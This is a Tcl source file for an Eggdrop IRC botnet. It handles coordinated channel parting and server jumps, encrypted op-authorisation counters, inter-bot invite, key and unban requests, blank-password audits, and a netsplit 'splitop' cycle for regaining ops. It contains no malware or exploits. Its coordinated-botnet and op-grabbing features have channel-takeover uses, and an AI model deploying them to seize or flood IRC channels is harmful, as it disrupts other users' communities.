bind filt n ".part*" part_chan
bind filt n ".-chan*" part_chan

proc part_channel { handle idx args } {
   global nick partKey lbthresh hbthresh takeoplist
   set args [lindex $args 0]
   if {![matchattr $nick boT]} { noflag $idx ; return }
   set key [sindex $args 0]
   if {![string match *:* [srange $args 1 end]]} {
      set channels [srange $args 1 end]
   } else {
      set info [split $args :]
      set channels [srange [string trim [lindex $info 0]] 1 end]
      set bots [string trim [lindex $info 1]]
   }
   putcmdlog "#$handle# netpart [srange $args 1 end]"
   if {$channels == ""} {
      putdcc $idx "\002Usage:\002 .netpart <key> <channel1> \[channel2\] ... \[: \[bots\]\]" ; return
   }
   if {![info exists partKey] || $partKey == ""} { putdcc $idx "NETPART command is currently disabled." ; return }
   if {![keycheck $idx $key $partKey "NETPART"]} { return }
   if {![info exists bots]} {
      foreach 1chan [split [string tolower $channels]] {
         if {[validchan $1chan]} {
            channel remove $1chan
            dumphelp "PART $1chan"
         }
         catch {unset lbthresh($1chan)} ; catch {unset hbthresh($1chan)} ; catch {unset takeoplist($1chan)}
         no_autokick $1chan
      }
      save_settings
      putdcc $idx "*** Parting all bots from '\002$channels\002' ..."
      catch {savechannels}
      putallbots "netpart $handle $key $channels"
   } else {
      foreach 1bot [split $bots] { catch {putbot $1bot "netpart $handle $key $channels"} }
      putdcc $idx "*** Parting selected bots from '\002$channels\002' ..."
   }
}
bind dcc n netpart part_channel

proc net_part { bot command args } {
   global partKey lbthresh hbthresh takeoplist
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set key [sindex $args 1] ; set channels [srange $args 2 end]
   if {[encryptpass $key] != $partKey} {
      putlog "\[\002WARNING\002\] \002$handle@$bot\002 tried to part me from '$channels' with a bogus key."
      return
   }
   foreach 1chan [split [string tolower $channels]] {
      if {[validchan $1chan]} {
         channel remove $1chan
         dumphelp "PART $1chan"
      }
      catch {unset lbthresh($1chan)} ; catch {unset hbthresh($1chan)} ; catch {unset takeoplist($1chan)}
      no_autokick $1chan
   }
   save_settings
   catch {savechannels}
   putlog "\[\002NETPART\002\] Parted from '\002$channels\002'"
   putlog " - Authorized by $handle@$bot"
}
bind bot - netpart net_part

proc cycle_chan { handle idx args } {
   set channel [sindex [lindex $args 0] 0]
   if {[valididx $idx]} {
      putcmdlog "#$handle# cycle $channel"
      if {$channel == ""} { putdcc $idx "\002Usage:\002 .cycle <channel>" ; return }
      if {![validchan $channel]} { putdcc $idx "Invalid channel." ; return }
   }
   puthelp "PART $channel"
   puthelp "JOIN $channel"
}
bind dcc n cycle cycle_chan

proc split_op { handle idx args } {
   set channel [sindex [lindex $args 0] 0]
   if {[valididx $idx]} {
      putcmdlog "#$handle# splitop $channel"
      if {$channel == ""} { putdcc $idx "\002Usage:\002 .splitop <channel>" ; return }
      if {![validchan $channel]} { putdcc $idx "Invalid channel." ; return }
      putdcc $idx "*** Cycling \002$channel\002 repeatedly to obtain ops ..."
   }
   if {[validchan $channel] && ![botisop $channel] && ([llength [chanlist $channel]] < 2)} {
      cycle_chan - - $channel
      setutimer 5 "split_op - - [str2tcl $channel]"
   }
}
bind dcc n splitop split_op

proc remote_jump { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# netjump $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   set identd 0
   if {[strcmp [sindex $args 0] -i]} {
      set identd 1
      set bot [sindex $args 1] ; set server [sindex $args 2] ; set port [sindex $args 3]
   } else { set bot [sindex $args 0] ; set server [sindex $args 1] ; set port [sindex $args 2] }
   if {$bot == ""} { putdcc $idx "\002Usage:\002 .netjump \[-i\] <bot> \[server\] \[port\]" ; return }
   if {$server == ""} {
      putdcc $idx "*** Jumping '$bot' to next available server ..."
   } elseif {$port == ""} {
      putdcc $idx "*** Jumping '$bot' to \002$server\002 ..."
   } else { putdcc $idx "*** Jumping '$bot' to \002$server $port\002 ..." }
   catch {putbot $bot "netjump $handle $identd $server $port"}
}
bind dcc n netjump remote_jump

proc net_jump { bot command args } {
   global proxybot identdconn
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set identd [sindex $args 1]
   set server [sindex $args 2] ; set port [sindex $args 3]
   if {$server == ""} {
      putlog "\[\002NETJUMP\002\] Jumping to next available server"
   } elseif {$port == ""} {
      putlog "\[\002NETJUMP\002\] Jumping to \002$server\002"
   } else { putlog "\[\002NETJUMP\002\] Jumping to \002$server\002 on port $port" }
   if {![info exists proxybot]} {
      if {$server == ""} { jump } elseif {[isnum $port]} { jump $server $port } else { jump $server }
   } elseif {$identd} {
      putlog " - Using IDENTD to connect ..."
      set identdconn 1
      if {$server == ""} { dumpserv "CONN [proxy_server]" ; return }
      if {[isnum $port]} { dumpserv "CONN $server $port" } else { dumpserv "CONN $server 6666" }
   } else {
      if {$server == ""} { dumpserv "conn [proxy_server]" ; return }
      if {[isnum $port]} { dumpserv "conn $server $port" } else { dumpserv "conn $server 6666" }
   }
   putlog " - Authorized by $handle@$bot"
}
bind bot - netjump net_jump

proc mass_jump { handle idx args } {
   global nick mainchan auth-passwd
   set args [lindex $args 0]
   set key [sindex $args 0] ; set bots [srange $args 1 end]
   putcmdlog "#$handle# massjump $bots"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} {
      putdcc $idx "\002Usage:\002 .mjump <auth-passwd> <bot1> \[bot2\] ..."
      putdcc $idx "NOTE: This command will \037ONLY\037 jump bots that are not currently on IRC."
      return
   }
   if {![isauth $idx] && ![keycheck $idx $key ${auth-passwd} "MASS JUMP"]} { return }
   if {![validchan $mainchan] || ![botisop $mainchan]} {
      putdcc $idx "*** This command is only available if I am opped on main channel." ; return
   }
   foreach 1bot [split $bots] {
      set jump 1
      foreach 1chan [channels] {
         if {[hand2nick $1bot $1chan] != ""} { set jump 0 ; break }
      }
      if {$jump} { catch {putbot $1bot "netjump $handle 0"} }
   }
}
bind dcc n mjump mass_jump
bind dcc n massjump mass_jump

proc do_jump { idx arg } {
   global proxybot identdconn
   if {![info exists proxybot] || ![strcmp [sindex $arg 0] .jump]} { return $arg }
   putcmdlog "#[idx2hand $idx]# [string range $arg 1 end]"
   if {[strcmp [sindex $arg 1] -i]} {
      set identdconn 1
      set server [sindex $arg 2] ; set port [sindex $arg 3]
      if {$server == ""} { dumpserv "CONN [proxy_server]" ; return }
      if {[isnum $port]} { dumpserv "CONN $server $port" } else { dumpserv "CONN $server 6666" }
   } else {
      set server [sindex $arg 1] ; set port [sindex $arg 2]
      if {$server == ""} { dumpserv "conn [proxy_server]" ; return }
      if {[isnum $port]} { dumpserv "conn $server $port" } else { dumpserv "conn $server 6666" }
   }
   return
}
bind filt m ".jump*" do_jump

proc auto_voice { unick host handle channel } {
   global autovoice
   set channel [string tolower $channel]
   if {![info exists autovoice] || [isclosed $channel] || [isautokick $channel]} { return }
   if {([matchattr $handle v] || [matchchanattr $handle 0 $channel]) && [lsearch $autovoice $channel] != -1} {
      pushmode $channel +v $unick
   }
}
bind join - * auto_voice

proc add_autovoice { handle idx args } {
   global autovoice
   set channels [lindex $args 0]
   putcmdlog "#$handle# +autovoice $channels"
   if {$channels == ""} {
      putdcc $idx "\002Usage:\002 .+autovoice <chan1> \[chan2\] ..."
      if {[info exists autovoice] && $autovoice != {}} { putdcc $idx "\n\002Current auto-voice channels:\002  $autovoice" }
      return
   }
   foreach 1chan [split [string tolower $channels]] {
      if {(![info exists autovoice] || [lsearch -exact $autovoice [string tolower $1chan]] == -1) && [validchan $1chan]} {
         lappend autovoice $1chan
      }
   }
   save_settings
   putdcc $idx "*** The following channels are now set to autovoice:  $autovoice"
}
bind dcc m +autovoice add_autovoice

proc del_autovoice { handle idx args } {
   global autovoice
   set channels [lindex $args 0]
   putcmdlog "#$handle# -autovoice $channels"
   if {$channels == ""} {
      putdcc $idx "\002Usage:\002 .-autovoice <chan1> \[chan2\] ..."
      if {[info exists autovoice] && $autovoice != {}} { putdcc $idx "\n\002Current auto-voice channels:\002  $autovoice" }
      return
   }
   if {![info exists autovoice] || [llength $autovoice] < 1} { return }
   foreach 1chan [split [string tolower $channels]] {
      if {[set s [lsearch -exact $autovoice $1chan]] != -1} { set autovoice [lreplace $autovoice $s $s] }
   }
   save_settings
   putdcc $idx "*** No longer autovoicing the following channel(s):  $channels"
}
bind dcc m -autovoice del_autovoice

###########################################


###########################################
##            Password Checks

proc pass_check { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# passcheck $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} {
      putdcc $idx "\002Usage:\002 .passcheck <*|bots>"
      putdcc $idx " "
   }
   putdcc $idx "\[\002PASSWORD CHECK\002\]"
   if {$args == "*" || $args == ""} {
      set numusers 0
      foreach 1user [userlist] {
         if {[passwdok $1user ""]} { lappend nopass $1user }
         incr numusers
      }
      if {[info exists nopass]} {
         putdcc $idx "     - Total Users ($numusers)  ***  \002[llength $nopass]\002 BLANK PASSWORD(S) ... \002$nick\002"
         putdcc $idx "       No password ([llength $nopass]):  [join $nopass]"
      } else { putdcc $idx "     - Total Users ($numusers)  ***  All passwords set ... \002$nick\002" }
      if {$args == "*"} { putallbots "netpasscheck $idx" }
   } else {
      foreach 1bot [split $args] { catch {putbot $1bot "netpasscheck $idx"} }
   }
}
bind dcc m passcheck pass_check
bind dcc m passwords pass_check
bind dcc m netpasscheck pass_check

proc net_passcheck { bot command args } {
   if {![matchattr $bot boT]} { return }
   set idx [lindex $args 0]
   set numusers 0
   foreach 1user [userlist] {
      if {[passwdok $1user ""]} { lappend nopass $1user }
      incr numusers
   }
   if {[info exists nopass] && [llength $nopass] > 0} {
      catch {putbot $bot "passresult $idx $numusers $nopass"}
   } else { catch {putbot $bot "passresult $idx $numusers"} }
}
bind bot - netpasscheck net_passcheck

proc pass_result { bot command args } {
   set args [lindex $args 0]
   set idx [sindex $args 0] ; set numusers [sindex $args 1] ; set nopass [srange $args 2 end]
   if {![valididx $idx]} { return }
   if {$nopass != "" && [llength $nopass] > 0} {
      putdcc $idx "     - Total Users ($numusers)  ***  \002[llength $nopass]\002 BLANK PASSWORD(S) ... \002$bot\002"
      putdcc $idx "       No password ([llength $nopass]):  [join $nopass]"
   } else { putdcc $idx "     - Total Users ($numusers)  ***  All passwords set ... \002$bot\002" }
}
bind bot - passresult pass_result

###########################################


##########################################
##       Full Banlist Protection

proc maxbans {} {
   global max-bans max-bans-timer nliftbans
   foreach 1chan [channels] {
      if {![botisop $1chan]} { continue }
      if {[llength [chanbans $1chan]] >= ${max-bans}} {
         putlog "\[\002FULL BANLIST\002\] Maximum number of bans reached in \002$1chan\002 (${max-bans})"
         putlog " *** Lifting \002$nliftbans\002 bans ..."
         set i 0
         foreach 1ban [chanbans $1chan] {
            pushmode $1chan -b $1ban
            incr i
            if {$i >= $nliftbans} { break }
         }
         flushmode $1chan
      }
   }
   setutimer ${max-bans-timer} maxbans
}

###########################################


###########################################
##       Botnet Server Status

proc server_status { handle idx args } {
   global nick server realserver
   set args [lindex $args 0]
   putcmdlog "#$handle# serverStatus $args"
   if {$args == ""} {
      putdcc $idx "\002Usage:\002 .serverStatus <*|bots>"
      putdcc $idx " "
   }
   putdcc $idx "\[\002BOTNET SERVER STATUS\002\]"
   if {$args == "*" || $args == ""} {
      if {[info exists realserver]} { set curserver $realserver } else { set curserver $server }
      putdcc $idx "   \002$nick\002   $curserver"
      if {$args == "*"} { putallbots "serverstatus $idx" }
      return
   }
   foreach 1bot [split $args] { catch {putbot $1bot "serverstatus $idx"} }
}
bind dcc m netservers server_status
bind dcc m serverstats server_status
bind dcc m serverstatus server_status
bind dcc m servstat server_status

proc net_serverstatus { bot command args } {
   global server realserver
   if {[info exists realserver]} { set curserver $realserver } else { set curserver $server }
   catch {putbot $bot "serverresult [sindex [lindex $args 0] 0] $curserver"}
}
bind bot - serverstatus net_serverstatus

proc server_result { bot command args } {
   set args [lindex $args 0]
   set idx [sindex $args 0]
   if {[valididx $idx]} { putdcc $idx "   \002$bot\002   [srange $args 1 end]" }
}
bind bot - serverresult server_result

###########################################


###########################################
##        Botnet Operating Systems

proc os_info { handle idx args } {
   global nick uname
   set args [lindex $args 0]
   putcmdlog "#$handle# OSinfo $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} {
      putdcc $idx "\002Usage:\002 .OSinfo <*|bots>"
      putdcc $idx " "
   }
   putdcc $idx "\[\002BOTNET OPERATING SYSTEMS\002\]"
   if {$args == "*" || $args == ""} {
      putdcc $idx "   \002$nick\002   $uname"
      if {$args == "*"} { putallbots "osinfo $idx" }
   } else {
      foreach 1bot [split $args] { catch {putbot $1bot "osinfo $idx"} }
   }
}
bind dcc n osinfo os_info

proc net_osinfo { bot command args } {
   global uname
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   catch {putbot $bot "osresult [sindex $args 0] $uname"}
}
bind bot - osinfo net_osinfo

proc os_result { bot command args } {
   set args [lindex $args 0]
   set idx [sindex $args 0]
   if {[valididx $idx]} { putdcc $idx "   \002$bot\002   [srange $args 1 end]" }
}
bind bot - osresult os_result

###########################################


###########################################
##       OP/Invite/Key/Limit/Unban

proc need_lim { from keyword args } { raiselimit [sindex [lindex $args 0] 1] }
proc need_inv { from keyword args } { inviteme [sindex [lindex $args 0] 1] }
proc need_unb { from keyword args } { unbanme [sindex [lindex $args 0] 1] }
proc need_key { from keyword args } { getkey [sindex [lindex $args 0] 1] }

bind raw - 471 need_lim
bind raw - 473 need_inv
bind raw - 474 need_unb
bind raw - 475 need_key

proc secureOp { unick channel } {
   global nick counters dontOp opauth
   if {![validchan $channel] || ![botisop $channel] || [isop $unick $channel]} { return }
   if {![onchan $unick $channel] || [onchansplit $unick $channel]} { return }
   set handle [nick2hand $unick $channel]
   if {![validop $handle $channel] || $handle == $nick} { return }
   if {[info exists dontOp([string tolower $handle])]} {
      announce "\[\002ALERT\002\] Unable to op $unick on $channel (handle: $handle):  $dontOp([string tolower $handle])"
      return
   }
   if {![info exists counters([string tolower $nick])]} { set counter 0 } else { set counter [decrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $counters([string tolower $nick])] }
   if {$counter == "" || $counter < 0} {
      announce "\[\002ALERT\002\] Unable to op users, auth counter is invalid (check for tampering)."
      return
   }
   incr counter
   set counters([string tolower $nick]) [encrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $counter]
   if {![save_settings]} {
      announce "\[\002ERROR\002\] Error saving TCL settings file: unable to op \002$unick\002 on $channel"
   } else {
      regsub -all " " "         " $nick key
      set key [string tolower [string range $key 0 10]]
      set auth [encrypt $key "[randstring [expr 1+[rand 2]]] $counter $unick [string tolower [string range $channel 0 10]]"]
      set opauth([string tolower $unick]:$auth) ""
      puthelp "MODE $channel +o-b $unick *!*@$auth"
      putloglev 2 * "\[\002OPS\002\] Gave ops to \002$unick\002 on $channel."
   }
}

proc manual_op { handle idx args } {
   global nick botnick mainchan manOp counters authKey
   set args [lindex $args 0]
   putcmdlog "#$handle# manualOp $args"
   if {$args == ""} { putdcc $idx "\002Usage:\002 .manualop <*|channel> \[seconds\]  (default: 30 sec)" ; return }
   if {[sindex $args 0] != "*"} {
      set channel [sindex $args 0]
      if {![validchan $channel]} { putdcc $idx "*** Unable to authorize manual op:  invalid channel" ; return }
   } else { set channel [channels] }
   if {![validchan $mainchan] || ![onchan $botnick $mainchan]} { putdcc $idx "*** Unable to authorize manual op:  I am not on main channel." ; return }
   set seconds [sindex $args 1]
   if {$seconds == ""} { set seconds 30 }
   if {$seconds < 1 || $seconds > 600} { putdcc $idx "*** Valid time frame is 1-600 seconds." ; return }
   if {[info exists counters([string tolower $nick])]} {
      set count [decrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $counters([string tolower $nick])]
   } else { set count 0 }
   if {![save_settings]} {
      putdcc $idx "*** Error saving TCL settings file: unable to authorize manual op" ; return
   } else {
      foreach 1chan [split $channel] {
         incr count
         set encryption "[randstring [expr [rand 3]+1]] $count $nick $handle $1chan $seconds"
         puthelp "PRIVMSG $mainchan :\002\002[encrypt [decrypt op SDxjN/byv4d1]$authKey $encryption]"
         set manOp([string tolower $handle:$1chan]) $seconds
         setutimer $seconds "catch {unset manOp([string tolower [str2tcl $handle:$1chan]])}"
      }
      set counters([string tolower $nick]) [encrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $count]
      save_settings
      foreach 1chan [channels] {
         set unick [hand2nick $handle $1chan]
         if {$unick != ""} {
            puthelp "NOTICE $unick :You are cleared for the specified channels."
            set cleared ""
            break
         }
      }
      putdcc $idx "*** You now have \002$seconds\002 seconds to manually op on specified channel(s)."
      if {![info exists cleared]} {
         putdcc $idx "*** Failed to locate your IRC nick to clear you for manual op, proceed at your own risk."
      } else { putdcc $idx "NOTE: Wait for bot notice clearance. (lag check)" }
   }
}
bind dcc m manop manual_op
bind dcc m manualop manual_op

proc manop_auth { unick host handle channel text } {
   global nick mainchan manOp counters authKey noprot
   if {![strcmp $channel $mainchan] || ![matchattr $handle bo] || [sindex $text 1] != "" || [string length [sindex $text 0]] < 3} { return }
   set text [string tolower [decrypt [decrypt op SDxjN/byv4d1]$authKey [string range $text 2 end]]]
   set rhandle $handle ; set handle [string tolower $handle]
   set counter [sindex $text 1] ; set bothand [sindex $text 2] ; set hand [sindex $text 3]
   set chan [sindex $text 4] ; set secs [sindex $text 5]
   if {[info exists noprot]} {
      if {![isnum $counter]} { return }
      set counters($handle) [encrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $counter]
      save_settings
      return
   }
   if {[info exists counters($handle)]} {
      set count [decrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $counters($handle)]
   } else { set count 0 }
   if {[isnum $counter] && $counter > $count && ($count == 0 || $counter < [expr $count + 1000000]) && [strcmp $handle $bothand]} {
      if {[validuser $hand] && [matchattr $hand op] && $secs > 0 && $secs < 601} {
         set counters($handle) [encrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $counter]
         set manOp($hand:$chan) $secs
         setutimer $secs "catch {unset manOp([str2tcl $hand:$chan])}"
         save_settings
      }
   } else { putlog "\[\002WARNING\002\] \002$unick\002 ($host) gave bogus manual-op authentication info. (handle: $rhandle)" }
}
bind pubm bo "% \002\002%" manop_auth

proc reset_counter { handle idx args } {
   global nick counters
   set args [lindex $args 0]
   set bot [sindex $args 0] ; set number [sindex $args 1]
   putcmdlog "#$handle# counter $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} { putdcc $idx "\002Usage:\002 .counter <*|bot> <number>  (valid range: 0-999999999)" ; return }
   if {![matchattr $bot bo] && $bot != "*"} { putdcc $idx "Invalid bot ($bot)" ; return }
   if {$number < 0 || $number > 999999999} { putdcc $idx "Invalid number  (valid range: 0-999999999)" ; return }
   if {$bot == "*"} { set bots [userlist bo] } else { set bots [split $bot] }
   set counter [encrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $number]
   foreach 1bot $bots {
      set counters([string tolower $1bot]) $counter
      foreach bot [bots] {
         if {[strcmp $bot $1bot]} { continue }
         catch {putbot $bot "counter $handle $1bot $counters([string tolower $1bot])"}
      }
   }
   save_settings
   putdcc $idx "*** Op-auth counter(s) have been reset to \002$number\002."
}
bind dcc n opauth reset_counter
bind dcc n counter reset_counter
bind dcc n counters reset_counter

proc net_resetcounter { bot command args } {
   global counters
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set thebot [sindex $args 1] ; set number [sindex $args 2]
   if {![matchattr $bot boT] || ![matchattr $thebot bo]} { return }
   set counters([string tolower $thebot]) $number
   setutimer 2 save_settings
   putlog "\[\002OPAUTH\002\] Op-auth counter for \002$thebot\002 adjusted by $handle@$bot."
}
bind bot - counter net_resetcounter

proc opme { channel } {
   global botnick noOp
   set channel [string tolower $channel]
   if {[getting-users] || ![info exists noOp] || $noOp} { setutimer 60 "opme all" ; return }
   if {[string tolower $channel] == "all" || $channel == ""} {
      set channels [channels]
   } else { set channels [split $channel] }
   foreach channel [scramble $channels] {
      if {![validchan $channel] || [botisop $channel] || ![onchan $botnick $channel]} { continue }
      foreach 1bot [scramble [bots]] {
         set nick [hand2nick $1bot $channel]
         if {[isop $nick $channel] && ![onchansplit $nick $channel]} {
            catch {putbot $1bot "requestop $botnick $channel"}
            putloglev 2 * "\[\002OPS\002\] Requested ops in \002$channel\002 from $1bot."
            break
         }
      }
   }
   setutimer 60 "opme all"
}

proc current_servinfo { from keyword args } {
   global botnick proxybot realserver takemode takeoplist
   set args [lindex $args 0]
   set nick [sindex $args 5] ; set channel [string tolower [sindex $args 1]]
   if {[info exists proxybot]} { set realserver $from }
   if {![validchan $channel] || ![info exists takemode($channel)] || ![string match *@* [sindex $args 6]]} { return 0 }
   if {![info exists takeoplist($channel)]} { set takeoplist($channel) {} }
   set user [finduser "[sindex $args 5]![sindex $args 2]@[sindex $args 3]"]
   if {![validop $user $channel] && [lsearch -exact [string tolower $takeoplist($channel)] [string tolower [sindex $args 5]]] == -1} {
      lappend takeoplist($channel) [sindex $args 5]
   }
}
bind raw - 352 current_servinfo

proc get_ops { from keyword args } {
   set channel [sindex [lindex $args 0] 1]
   if {[validchan $channel] && ![botisop $channel]} { opme $channel }
   return 0
}
bind raw - 315 get_ops

proc requested_op { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   catch {putbot $bot "confirmbotnick [sindex $args 0] [sindex $args 1]"}
}
bind bot - requestop requested_op

proc confirmedbot { bot command args } {
   if {![matchattr $bot bo]} { return }
   global botnick
   set args [lindex $args 0]
   set opnick [sindex $args 0] ; set channel [sindex $args 1]
   if {[strcmp $opnick $botnick] && [onchan $botnick $channel] && ![botisop $channel]} {
      catch {putbot $bot "opbot $botnick $channel"}
   }
}
bind bot - confirmbotnick confirmedbot

proc opbot { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set opnick [sindex $args 0] ; set channel [sindex $args 1]
   if {![validchan $channel] || ![onchan $opnick $channel]} { return }
   set handle [nick2hand $opnick $channel]
   if {![matchattr $handle bo] && ![matchchanattr $handle bo $channel]} {
      announce "\[\002ALERT\002\] Unable to accept ops request from \002$opnick\002 on $channel."
      announce " - Please make sure it has the proper flags and hosts on all bots."
   } elseif {![strcmp $handle $bot]} {
      announce "\[\002WARNING\002\] \002$bot\002 requested ops on $channel for a bot other than itself."
      announce " - Request was for $opnick (handle: $handle)"
      announce " - THIS IS NOT NORMAL!  Check for hack attempt of $bot."
   } else { secureOp $opnick $channel }
}
bind bot - opbot opbot

proc inviteme { channel } {
   global botnick askedinv
   set channel [string tolower $channel]
   if {[info exists askedinv($channel)] || $botnick == ""} { return }
   putloglev 2 * "\[\002INV\002\] Requesting invite to \002$channel\002."
   putallbots "inviteme $botnick $channel"
   set askedinv($channel) 1
   setutimer 60 "catch {unset askedinv([str2tcl $channel])}"
}

proc invitebot { bot command args } {
   global botnick
   set args [lindex $args 0]
   set nick [sindex $args 0] ; set channel [sindex $args 1]
   if {$bot == $botnick || $nick == "" || ![matchattr $bot bo] || ![validchan $channel] ||
       ![botisop $channel] || ([onchan $nick $channel] && ![onchansplit $nick $channel])} {
      return
   }
   putserv "INVITE $nick $channel"
   putloglev 2 * "\[\002INV\002\] Invited $nick to $channel."
}
bind bot - inviteme invitebot

proc got_invite { from keyword args } {
   global invited
   set channel [string tolower [string range [sindex [lindex $args 0] 1] 1 end]]
   if {![info exists invited($channel)]} {
      set invited($channel) ""
      setutimer 10 "catch {unset invited([str2tcl $channel])}"
      return 0
   } else { return 1 }
}
bind raw - INVITE got_invite

proc getkey { channel } {
   global askedkey chankey
   set channel [string tolower $channel]
   if {[info exists askedkey($channel)]} { return }
   if {[info exists chankey($channel)]} { putserv "JOIN $channel $chankey($channel)" }
   putallbots "sendkey $channel"
   putloglev 2 * "\[\002KEY\002\] Requesting channel key for \002$channel\002."
   set askedkey($channel) ""
   setutimer 60 "catch {unset askedkey([str2tcl $channel])}"
}

proc sendkey { bot command args } {
   global botnick
   set args [lindex $args 0]
   set channel [sindex $args 0]
   if {$bot == $botnick || ![matchattr $bot bo] || ![validchan $channel] ||
       [onchan $bot $channel] || ![onchan $botnick $channel]} { return }
   if {[string match *k* [sindex [getchanmode $channel] 0]]} {
      set chankey [sindex [getchanmode $channel] 1]
      catch {putbot $bot "channelkey $channel $chankey"}
      putloglev 2 * "\[\002KEY\002\] Sent \002$bot\002 channel key for $channel ($chankey)."
   }
}
bind bot - sendkey sendkey

proc gotkey { bot command args } {
   global botnick key gotkey chankey
   set args [lindex $args 0]
   set channel [sindex $args 0] ; set key [sindex $args 1]
   if {[info exists gotkey($channel)] || ![validchan $channel] || [onchan $botnick $channel]} { return }
   if {$key != ""} {
      set chankey($channel) $key
      set gotkey($channel) ""
      setutimer 30 "set gotkey([str2tcl $channel]) 0"
   }
   putserv "JOIN $channel $key"
}
bind bot - channelkey gotkey

proc raiselimit { channel } {
   global askedlim
   set channel [string tolower $channel]
   if {[info exists askedlim($channel)]} { return }
   if {[bots] != ""} {
      catch {putbot [lindex [bots] [rand [llength [bots]]]] "netraiselimit $channel"}
      set askedlim($channel) ""
      setutimer 10 "putallbots \"netraiselimit [str2tcl $channel]\""
      setutimer 60 "catch {unset askedlim([str2tcl $channel])}"
      putloglev 2 * "\[\002LIMIT\002\] Requesting limit increase on \002$channel\002."
      return
   }
   putloglev 2 * "\[\002LIMIT\002\] Need limit increase on \002$channel\002, but no bots are linked."
}

proc net_raiselimit { bot command args } {
   global botnick
   set args [lindex $args 0]
   set channel [sindex $args 0]
   if {![matchattr $bot bo] || ![validchan $channel] || ![botisop $channel] ||
        [onchan [hand2nick $bot $channel] $channel]} { return }
   set chanLimit [expr [llength [chanlist $channel]] + 1]
   if {![string match *l* [sindex [getchanmode $channel] 0]]} {
      # Account for possible desynch
      putserv "MODE $channel -l"
      putserv "MODE $channel +l $chanLimit"
      putlog "\[\002LIMIT\002\] Raised limit on \002$channel\002 for $bot. (+l $chanLimit)"
   } elseif {![string match *k* [sindex [getchanmode $channel] 0]] && ([sindex [getchanmode $channel] 1] < $chanLimit)} {
      putserv "MODE $channel +l $chanLimit"
      putlog "\[\002LIMIT\002\] Raised limit on \002$channel\002 for $bot. (+l $chanLimit)"
   } elseif {[string match *k* [sindex [getchanmode $channel] 0]] && ([sindex [getchanmode $channel] 2] < $chanLimit)} {
      putserv "MODE $channel +l $chanLimit"
      putlog "\[\002LIMIT\002\] Raised limit on \002$channel\002 for $bot. (+l $chanLimit)"
   }
}
bind bot - netraiselimit net_raiselimit

proc unbanme { channel } {
   global botname askedunban noOp
   set channel [string tolower $channel]
   if {[info exists askedunban($channel)] || ([info exists noOp] && $noOp)} { return }
   if {[bots] != ""} {
      catch {putbot [lindex [bots] [rand [llength [bots]]]] "unbanbot $channel $botname"}
      set askedunban($channel) ""
      setutimer 10 "putallbots \"unbanbot [str2tcl $channel] $botname\""
      setutimer 60 "catch {unset askedunban([str2tcl $channel])}"
      putloglev 2 * "\[\002UNBAN\002\] Requesting to be unbanned from \002$channel\002."
      return
   }
   putloglev 2 * "\[\002UNBAN\002\] Need to be unbanned from \002$channel\002, but no bots are linked."
}

proc unban_bot { bot command args } {
   global botnick
   set args [lindex $args 0]
   set channel [sindex $args 0] ; set host [string tolower [sindex $args 1]]
   if {![matchattr $bot bo] || ![validchan $channel] || ![botisop $channel] ||
        [onchan [hand2nick $bot $channel] $channel]} { return }
   foreach 1ban [string tolower [chanbans $channel]] {
      if {[string match [str2tcl $1ban] $host]} {
         if {![killchanban $channel $1ban]} { pushmode $channel -b $1ban }
         putlog "\[\002UNBAN\002\] Unbanned \002$bot\002 from $channel. ($1ban)"
      }
   }
}
bind bot - unbanbot unban_bot

proc rejoin_chans {} {
   global nick botnick server askedinv askedunban askedlim
   if {[matchattr $nick L]} { kill_timer rejoin_chans ; return }
   if {$server != ""} {
      foreach channel [string tolower [channels]] {
         if {[onchan $botnick $channel]} { continue }
         catch {unset askedinv($channel)} ; catch {unset askedunban($channel)} ; catch {unset askedlim($channel)}
         dumpserv "JOIN $channel"
      }
   }
   settimer 5 rejoin_chans
}


###########################################
##              Anti-Idle

proc anti_idle {} {
   global botnick
   if {[bots] != ""} { set randbot [hand2nick [lindex [bots] [rand [llength [bots]]]] [lindex [channels] 0]] }
   if {[info exists randbot] && $randbot != ""} { putserv "PRIVMSG $randbot :." } else { putserv "PRIVMSG $botnick :." }
   settimer [expr 4 + [rand 6]] anti_idle
}

proc halt { nick host handle args } { return }
bind msg b . halt


###########################################
##             DCC Auto-Away

proc dcc_autoaway {} {
   global awaytime awaycheck awaymsg
   foreach 1dcc [dcclist] {
      set idx [lindex $1dcc 0]
      if {[matchattr [idx2hand $idx] S]} { continue }
      if {[string tolower [lindex $1dcc 3]] == "chat"} {
         set idletime [expr [getdccidle $idx] / 60]
         if {$idletime > $awaytime && [getdccaway $idx] == "" && $awaytime > 0} { setdccaway $idx $awaymsg }
      }
   }
   settimer $awaycheck dcc_autoaway
}

proc tcl_versions { handle idx args } {
   global nick version tclVersion varsVersion group
   set bots [lindex $args 0]
   putcmdlog "#$handle# versions $bots"
   if {$bots == ""} {
      putdcc $idx "\002Usage:\002 .versions <*|bots>"
      putdcc $idx " "
   }
   if {![info exists varsVersion]} { set varsVersion "(unknown)" }
   putdcc $idx "\[\002$group File Versions\002\]"
   if {$bots == "*" || $bots == ""} {
      putdcc $idx " - BIN:v[sindex $version 0]     TCL:$tclVersion     VARS:$varsVersion  ...  \002$nick\002"
      if {$bots == "*"} { putallbots "tclversion $idx" }
      return
   }
   foreach 1bot [split $bots] { catch {putbot $1bot "tclversion $idx"} }
}
